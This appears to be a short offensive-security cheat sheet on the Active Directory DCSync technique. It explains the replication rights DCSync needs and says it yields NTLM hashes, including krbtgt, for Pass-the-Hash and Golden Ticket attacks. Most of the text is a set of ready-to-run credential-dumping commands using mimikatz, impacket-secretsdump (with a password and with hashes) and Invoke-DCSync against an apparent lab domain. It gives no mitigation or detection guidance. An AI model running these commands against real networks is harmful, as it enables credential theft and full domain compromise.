**DCSync** is a technique where an attacker uses replication permissions to impersonate a Domain Controller and request password data from AD. It abuses the **Directory Replication Service Remote Protocol (DRSR)**.

Requires specific rights:
- `Replicating Directory Changes`
- `Replicating Directory Changes All`
- `Replicating Directory Changes In Filtered Set` (for newer versions).


---

## What It Retrieves

- NTLM hashes of user accounts (including **krbtgt**).
- Useful for **Pass‑the‑Hash**, **Golden Ticket**, or **Silver Ticket** attacks.
- Essentially gives full control over authentication in the domain.

---

## Exploitation

### 1. Mimikatz

Run from a privileged account with replication rights:

```powershell
mimikatz # lsadump::dcsync /domain:cons.thl /user:Administrator
```

To dump the **krbtgt** account:

```powershell
mimikatz # lsadump::dcsync /domain:cons.thl /user:krbtgt
```

---

### 2. Impacket (secretsdump.py)

From Linux:

```bash
impacket-secretsdump cons.thl/Administrator:'Password123!'@192.168.56.116
```

Or using NTLM hash:

```bash
impacket-secretsdump cons.thl/Administrator@192.168.56.116 -hashes :aad3b435b51404eeaad3b435b51404ee,31d6cfe0d16ae931b73c59d7e0c089c0
```

---

### 3. PowerShell (Invoke-DCSync from PowerSploit)

```powershell
Invoke-DCSync -Domain cons.thl -UserName Administrator
```

